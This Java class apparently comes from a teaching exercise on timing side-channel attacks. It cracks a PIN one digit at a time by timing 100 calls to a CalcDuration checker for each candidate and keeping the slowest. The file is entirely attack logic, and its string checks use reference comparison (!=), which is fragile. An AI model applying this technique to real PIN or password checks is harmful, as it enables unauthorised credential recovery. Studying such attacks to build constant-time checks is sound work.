public class TimingAttackAlgorithm {

    //this is a placeholder, the correct pin numbers will be appended to this value.
    private String attackPin = "";
    private CalcDuration calculator;


    public TimingAttackAlgorithm(CalcDuration calculator) {
        this.calculator = calculator;
    }

    public String crackPin(String[] valueArray, Integer index){

        Pair highestPair = null;

        for ( String value : valueArray) {

            if(attackPin != ""){
                if(value != "lazy") {
                    value = attackPin + value;
                }
            }

            long totalduration = 0;
            for(int i = 0; i <100; i++){
                totalduration = totalduration + calculator.calcDuration(value);
            }

            if(value != "lazy") {
                System.out.println("Pin :  " + value + "  totalduration :  " + totalduration);
            }

            if(value != "lazy") {
                if(highestPair == null || totalduration > highestPair.Duration){
                    highestPair = new Pair(value, totalduration);
                }
            }
        }
        System.out.println();
        System.out.println("matching value is " + highestPair.Value + " with duration " + highestPair.Duration );
        attackPin = attackPin + highestPair.Value.charAt(index);
        System.out.println("the cracked Pin is  : " + attackPin);
        System.out.println();

        return attackPin;
    }
}
